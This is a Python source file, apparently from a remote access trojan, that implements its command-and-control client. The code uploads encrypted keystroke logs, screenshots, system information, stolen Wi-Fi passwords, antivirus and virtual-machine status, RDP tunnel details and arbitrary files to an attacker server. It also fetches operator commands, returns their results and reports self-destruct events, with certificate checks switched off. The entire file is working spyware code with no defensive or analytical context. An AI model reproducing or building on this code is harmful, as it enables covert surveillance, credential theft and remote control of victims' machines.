import requests
import json
import logging
import time
from typing import Dict, List
from encryption.manager import EncryptionManager
import gzip
import base64
from rat_config import Config

# Always enable INFO logging, DEBUG if enabled
logging.basicConfig(
    level=logging.DEBUG if Config.DEBUG_MODE else logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler(Config.ERROR_LOG_FILE),
        logging.StreamHandler()
    ]
)

class ServerCommunicator:
    def __init__(self, client_id, encryption_manager):
        self.client_id = client_id
        self.encryption = encryption_manager
        self.server_url = Config.SERVER_URL.rstrip('/')
        self.version_url = Config.UPDATE_URL
        self.token = Config.SECRET_TOKEN
        self.proxies = {
            "http": Config.PROXY_HTTP,
            "https": Config.PROXY_HTTPS
        } if Config.PROXY_HTTP or Config.PROXY_HTTPS else None

    def _send_request(self, action: str, data: Dict = None, files=None):
        try:
            url = self.server_url
            payload = {'action': action}
            if data:
                payload.update(data)
            logging.info(f"Sending request to {url} with action={action}, data_keys={list(payload.keys()) if payload else None}, files={files is not None}, proxies={self.proxies}")
            
            if files:
                response = requests.post(
                    url,
                    data=payload,
                    files=files,
                    verify=False,
                    timeout=Config.COMMAND_TIMEOUT,
                    proxies=self.proxies
                )
            else:
                response = requests.post(
                    url,
                    json=payload,
                    verify=False,
                    timeout=Config.COMMAND_TIMEOUT,
                    proxies=self.proxies
                )
            return self._handle_response(response)
        except requests.exceptions.RequestException as e:
            logging.error(f"Connection error: {str(e)}")
            raise CommunicationError(f"Connection error: {str(e)}")

    def check_version(self) -> Dict:
        try:
            logging.info(f"Checking for updates: client_id={self.client_id}")
            data = {
                "action": "check_version",
                "client_id": self.client_id,
                "token": self.token
            }
            logging.info(f"Sending version check request to {self.version_url}: {data}")
            response = requests.post(
                self.version_url,
                json=data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            logging.info(f"Version check response: status={response.status_code}, text={response.text}")
            return response.json()
        except requests.exceptions.RequestException as e:
            logging.error(f"Version check error: {str(e)}")
            return {"error": f"Version check failed: {str(e)}"}
        except json.JSONDecodeError:
            logging.error("Invalid JSON response from version check")
            return {"error": "Invalid JSON response"}

    def report_rdp_tunnel(self, tunnel_info: Dict) -> Dict:
        try:
            logging.info(f"Preparing RDP tunnel report: client_id={self.client_id}")
            tunnel_info_json = json.dumps(tunnel_info, ensure_ascii=False)
            encrypted_tunnel_info = self.encryption.encrypt(tunnel_info_json)
            encrypted_data = {
                "action": "report_rdp_tunnel",
                "client_id": self.client_id,
                "token": self.token,
                "tunnel_info": encrypted_tunnel_info
            }
            logging.info(f"Sending RDP tunnel report: {encrypted_data}")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            logging.info("RDP tunnel report sent successfully")
            return response.json()
        except Exception as e:
            logging.error(f"RDP tunnel report error: {str(e)}")
            raise CommunicationError(f"RDP tunnel report error: {str(e)}")

    def report_update(self, new_version: str) -> Dict:
        try:
            logging.info(f"Preparing update report: client_id={self.client_id}, new_version={new_version}")
            report_data = {
                "message": f"Updated to version {new_version}",
                "client_id": self.client_id,
                "new_version": new_version,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            encrypted_report = self.encryption.encrypt(json.dumps(report_data, ensure_ascii=False))
            encrypted_data = {
                "action": "report_update",
                "client_id": self.client_id,
                "token": self.token,
                "report": encrypted_report
            }
            logging.info(f"Sending update report: {encrypted_data}")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            logging.info("Update report sent successfully")
            return response.json()
        except Exception as e:
            logging.error(f"Update report error: {str(e)}")
            raise CommunicationError(f"Update report error: {str(e)}")

    def upload_vm_status(self, vm_details: Dict) -> Dict:
        try:
            logging.info(f"Preparing VM status upload: client_id={self.client_id}")
            vm_details_json = json.dumps(vm_details, ensure_ascii=False)
            encrypted_vm_details = self.encryption.encrypt(vm_details_json)
            encrypted_data = {
                "action": "upload_vm_status",
                "client_id": self.client_id,
                "token": self.token,
                "vm_details": encrypted_vm_details
            }
            logging.info(f"Sending upload_vm_status: {encrypted_data}")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            logging.info("VM status upload successful")
            return response.json()
        except Exception as e:
            logging.error(f"VM status upload error: {str(e)}")
            raise CommunicationError(f"VM status upload error: {str(e)}")

    def upload_antivirus_status(self, antivirus_data: Dict) -> Dict:
        try:
            logging.info(f"Antivirus status upload: client_id={self.client_id}")
            antivirus_data_json = json.dumps(antivirus_data, ensure_ascii=False)
            encrypted_antivirus_data = self.encryption.encrypt(antivirus_data_json)
            encrypted_data = {
                "action": "upload_antivirus_status",
                "client_id": self.client_id,
                "token": self.token,
                "antivirus_data": encrypted_antivirus_data
            }
            logging.info(f"Sending antivirus status: {encrypted_data}")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            logging.info("Antivirus status upload successful")
            return response.json()
        except Exception as e:
            logging.error(f"Antivirus status upload error: {str(e)}")
            raise CommunicationError(f"Antivirus status upload error: {str(e)}")

    def report_self_destruct(self) -> Dict:
        try:
            logging.info(f"Preparing self-destruct report: client_id={self.client_id}")
            report_data = {
                "message": "Self-destruct initiated due to critical error",
                "client_id": self.client_id,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            encrypted_report = self.encryption.encrypt(json.dumps(report_data, ensure_ascii=False))
            encrypted_data = {
                "action": "report_self_destruct",
                "client_id": self.client_id,
                "token": self.token,
                "report": encrypted_report
            }
            logging.info(f"Sending self-destruct report: {encrypted_data}")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            logging.info("Self-destruct report sent successfully")
            return response.json()
        except Exception as e:
            logging.error(f"Self-destruct report error: {str(e)}")
            return {"error": f"Self-destruct report error: {str(e)}"}

    def _handle_response(self, response):
        logging.info(f"Received response: status={response.status_code}, text={response.text[:100]}...")
        if response.status_code == 200:
            try:
                data = response.json()
                if not isinstance(data, dict) or 'commands' not in data:
                    logging.error("Invalid response format: Missing 'commands' key")
                    raise CommunicationError("Invalid response format: Missing 'commands' key")
                if not isinstance(data['commands'], list):
                    logging.error("Invalid commands format: Expected list")
                    raise CommunicationError("Invalid commands format: Expected list")
                return data['commands']
            except json.JSONDecodeError:
                logging.error("Invalid JSON response")
                raise CommunicationError("Invalid JSON response")
        else:
            logging.error(f"Server error: {response.status_code}, response: {response.text}")
            raise CommunicationError(f"Server error: {response.status_code}")

    def upload_data(self, keystrokes, system_info, screenshot=None):
        try:
            if not keystrokes or not isinstance(keystrokes, list):
                logging.warning("Keystrokes is empty or not a list")
                keystrokes = ['']
            if not system_info or not isinstance(system_info, dict):
                logging.warning("System_info is empty or not a dict")
                system_info = {'error': 'No system info provided'}
            keystrokes_str = ' '.join(str(k) for k in keystrokes if k)
            system_info_json = json.dumps(system_info, ensure_ascii=False)
            logging.info(f"Preparing upload: client_id={self.client_id}, keystrokes_len={len(keystrokes_str)}, system_info_len={len(system_info_json)}")
            try:
                encrypted_keystrokes = self.encryption.encrypt(keystrokes_str)
                encrypted_system_info = self.encryption.encrypt(system_info_json)
            except Exception as e:
                logging.error(f"Encryption failed: {str(e)}")
                raise CommunicationError(f"Encryption failed: {str(e)}")
            if not encrypted_keystrokes or not encrypted_system_info:
                logging.error("Encryption produced empty output")
                raise CommunicationError("Encryption produced empty output")
            encrypted_data = {
                "action": "upload_data",
                "client_id": self.client_id,
                "token": self.token,
                "keystrokes": encrypted_keystrokes,
                "system_info": encrypted_system_info
            }
            files = {}
            if screenshot:
                files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
                logging.info("Including screenshot in upload")
            if files:
                response = requests.post(
                    self.server_url,
                    data=encrypted_data,
                    files=files,
                    timeout=Config.COMMAND_TIMEOUT,
                    verify=False,
                    proxies=self.proxies
                )
            else:
                response = requests.post(
                    self.server_url,
                    json=encrypted_data,
                    timeout=Config.COMMAND_TIMEOUT,
                    verify=False,
                    proxies=self.proxies
                )
            response.raise_for_status()
            logging.info("Upload successful")
            return response.json()
        except Exception as e:
            logging.error(f"Upload error: {str(e)}")
            raise CommunicationError(f"Upload error: {str(e)}")

    def fetch_commands(self):
        try:
            logging.info("Fetching commands...")
            response = self._send_request(
                "get_commands",
                data={
                    "client_id": self.client_id,
                    "token": self.token
                }
            )
            logging.info(f"Raw commands received: {response}")
            validated_commands = []
            for cmd in response:
                if not all(k in cmd for k in ('id', 'command')):
                    logging.warning(f"Skipping invalid command: {cmd}")
                    continue
                try:
                    decrypted = self.encryption.decrypt(cmd['command'])
                    logging.info(f"Decrypted command: {decrypted}")
                    if decrypted.startswith('/'):
                        command_type = decrypted.strip('/')
                        params = {}
                    else:
                        command_data = json.loads(decrypted)
                        command_type = command_data.get('type')
                        params = command_data.get('params', {})
                    logging.info(f"Parsed command data: type={command_type}, params={params}")
                    if not command_type:
                        logging.error(f"Command missing 'type': {decrypted}")
                        continue
                    validated_commands.append({
                        'id': cmd['id'],
                        'command': cmd['command'],
                        'type': command_type,
                        'params': params
                    })
                except Exception as e:
                    logging.error(f"Command validation failed: {str(e)}, command={cmd}")
            logging.info(f"Validated commands: {validated_commands}")
            return validated_commands
        except Exception as e:
            logging.error(f"Failed to fetch commands: {str(e)}")
            raise CommunicationError(f"Failed to process commands: {str(e)}")

    def upload_wifi_passwords(self, wifi_data: Dict) -> Dict:
        try:
            logging.info(f"Preparing Wi-Fi passwords upload: client_id={self.client_id}")
            wifi_data_json = json.dumps(wifi_data, ensure_ascii=False)
            encrypted_wifi_data = self.encryption.encrypt(wifi_data_json)
            encrypted_data = {
                "action": "upload_wifi_passwords",
                "client_id": self.client_id,
                "token": self.token,
                "wifi_data": encrypted_wifi_data
            }
            logging.info(f"Sending Wi-Fi passwords: {encrypted_data}")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            logging.info("Wi-Fi passwords upload successful")
            return response.json()
        except Exception as e:
            logging.error(f"Wi-Fi passwords upload error: {str(e)}")
            raise CommunicationError(f"Wi-Fi passwords upload error: {str(e)}")

    def send_command_result(self, command_id, result):
        try:
            logging.info(f"Sending command result for command_id: {command_id}")
            compressed_result = gzip.compress(json.dumps(result).encode())
            encrypted_result = self.encryption.encrypt(base64.b64encode(compressed_result).decode())
            logging.info(f"Encrypted result: {encrypted_result[:50]}...")
            data = {
                'action': 'command_response',
                'client_id': self.client_id,
                'command_id': str(command_id),
                'result': encrypted_result,
                'token': self.token
            }
            response = requests.post(
                self.server_url,
                json=data,
                headers={'Content-Type': 'application/json'},
                verify=False,
                timeout=Config.COMMAND_TIMEOUT,
                proxies=self.proxies
            )
            response.raise_for_status()
            logging.info(f"Received response: {response.status_code}")
            return response.json()
        except Exception as e:
            logging.error(f"Failed to send command result: {str(e)}")
            raise CommunicationError(f"Failed to send command result: {str(e)}")

    def upload_file(self, file_data: Dict) -> Dict:
        try:
            logging.info(f"Preparing file upload: client_id={self.client_id}, filename={file_data['filename']}")
            files = {
                "file": (file_data["filename"], file_data["content"], "application/octet-stream")
            }
            data = {
                "action": "upload_file",
                "client_id": file_data["client_id"],
                "token": self.token,
                "timestamp": file_data["timestamp"]
            }
            logging.info(f"Sending file upload request: {data}")
            response = requests.post(
                self.server_url,
                data=data,
                files=files,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            logging.info(f"File uploaded successfully: {file_data['filename']}")
            return response.json()
        except Exception as e:
            logging.error(f"File upload error: {str(e)}")
            raise CommunicationError(f"File upload error: {str(e)}")

class CommunicationError(Exception):
    pass